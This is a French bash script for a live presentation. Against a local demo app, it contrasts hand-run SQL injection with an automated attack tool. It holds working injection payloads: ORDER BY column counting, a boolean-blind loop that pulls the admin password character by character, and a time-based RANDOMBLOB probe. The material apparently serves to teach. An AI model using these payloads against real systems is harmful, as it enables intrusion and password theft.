#!/bin/bash
# demo_manuel_vs_auto.sh -- a executer en DIRECT pendant la presentation.
# Montre concretement pourquoi l'exploitation manuelle d'une injection SQL
# est lente, avant de montrer la version automatisee avec sqlmap.
#
# Prerequis : python3 app.py doit deja tourner sur http://127.0.0.1:5500

TARGET="http://127.0.0.1:5500/product"

pause() {
  echo ""
  read -p ">>> Appuie sur Entree pour continuer..." _
  echo ""
}

echo "============================================================"
echo " DEMO 1 : deviner le nombre de colonnes A LA MAIN (UNION)"
echo "============================================================"
echo "On doit essayer ORDER BY 1, 2, 3... un par un jusqu'a l'erreur."
pause

for n in 1 2 3 4 5; do
  echo "--- tentative : id=1 ORDER BY $n-- ---"
  result=$(curl -s -G "$TARGET" --data-urlencode "id=1 ORDER BY $n--" | grep -o "SQL Error[^<]*")
  if [ -z "$result" ]; then
    echo "   pas d'erreur -> au moins $n colonnes"
  else
    echo "   ERREUR: $result"
    echo "   => il y a $((n-1)) colonnes. Il a fallu $n requetes, tapees a la main."
  fi
  sleep 0.3
done
pause

echo "============================================================"
echo " DEMO 2 : extraire UN SEUL caractere du mot de passe admin"
echo " (boolean-based blind, a la main, lettre par lettre)"
echo "============================================================"
echo "On teste chaque lettre possible jusqu'a trouver la bonne."
pause

start=$(date +%s)
found=""
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z \
         A B C D E F G H I J K L M N O P Q R S T U V W X Y Z; do
  cond="1 AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='$c'"
  result=$(curl -s -G "$TARGET" --data-urlencode "id=$cond" | grep -c "Clavier")
  echo "   essai '$c'..."
  if [ "$result" -gt 0 ]; then
    found="$c"
    break
  fi
done
end=$(date +%s)
echo ""
echo ">>> Premier caractere trouve : '$found' en $((end - start)) secondes"
echo ">>> Le mot de passe fait 16 caracteres. Rien que pour CE SEUL caractere,"
echo "    il a fallu tester plusieurs dizaines de lettres avant de trouver la bonne."
echo "    Pour les 16 caracteres : potentiellement plus de 1000 requetes manuelles."
pause

echo "============================================================"
echo " DEMO 3 : time-based blind -- la difference se MESURE"
echo "============================================================"
echo "Condition FAUSSE (pas de delai) :"
time curl -s -G "$TARGET" --data-urlencode "id=1 AND (SELECT CASE WHEN (1=2) THEN RANDOMBLOB(300000000) ELSE 1 END)" -o /dev/null

echo ""
echo "Condition VRAIE (declenche un calcul lourd) :"
time curl -s -G "$TARGET" --data-urlencode "id=1 AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(300000000) ELSE 1 END)" -o /dev/null
echo ""
echo ">>> La difference de temps (souvent ~0.02s vs ~2s) PROUVE l'injection,"
echo "    sans jamais voir le contenu de la reponse. Mais il faut repeter ca"
echo "    pour chaque caractere de chaque donnee a extraire."
pause

echo "============================================================"
echo " MAINTENANT : la meme chose, 100% automatisee"
echo "============================================================"
echo "Une seule commande fait TOUT ce qu'on vient de faire a la main,"
echo "plus l'enumeration des tables et le dump complet :"
echo ""
echo "   python3 auto_attack.py \"$TARGET?id=1\""
echo ""
pause

time python3 auto_attack.py "$TARGET?id=1"

echo ""
echo "============================================================"
echo " CONCLUSION A DIRE A L'ORAL :"
echo " Ce qui aurait pris des dizaines de minutes et des centaines"
echo " de requetes tapees a la main a ete fait en quelques dizaines"
echo " de secondes, sans aucune intervention humaine entre les etapes."
echo "============================================================"
